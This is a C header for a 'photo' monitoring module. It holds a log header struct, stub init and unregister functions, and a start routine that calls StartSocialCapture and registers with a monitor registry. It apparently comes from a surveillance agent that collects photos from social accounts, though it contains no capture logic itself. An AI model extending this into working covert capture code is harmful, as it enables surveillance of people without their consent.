#ifndef PHOTO_H
#define PHOTO_H

extern void StartSocialCapture();
extern DWORD AM_MonitorRegister(WCHAR *, DWORD, BYTE *, BYTE *, BYTE *, BYTE *);
//BOOL bPM_PhotoStarted;

typedef struct _PHOTO_ADDITIONAL_HEADER
{
#define LOG_PHOTO_VERSION 2015012601
	UINT	uVersion;
	CHAR	strJsonLog[0];
} PHOTO_ADDITIONAL_HEADER, *LPPHOTO_ADDITIONAL_HEADER;

typedef struct _PHOTO_LOGS
{
	DWORD	dwSize;
	LPBYTE	lpBuffer;
} PHOTO_LOGS, *LPPHOTO_LOGS;

DWORD __stdcall PM_PhotoUnregister()
{
	return 1;
}

DWORD __stdcall PM_PhotoInit(JSONObject elem)
{

	return 1;
}

DWORD __stdcall PM_PhotoStartStop(BOOL bStartFlag, BOOL bReset)
{
	bPM_PhotosStarted = TRUE;
	
	if (bStartFlag)
		StartSocialCapture();
	
	
	return 1;
}

void PM_PhotoRegister()
{
	bPM_PhotosStarted = FALSE;
	AM_MonitorRegister(L"photo", PM_PHOTO, NULL, (BYTE *)PM_PhotoStartStop, (BYTE *)PM_PhotoInit, (BYTE *)PM_PhotoUnregister);
}
#endif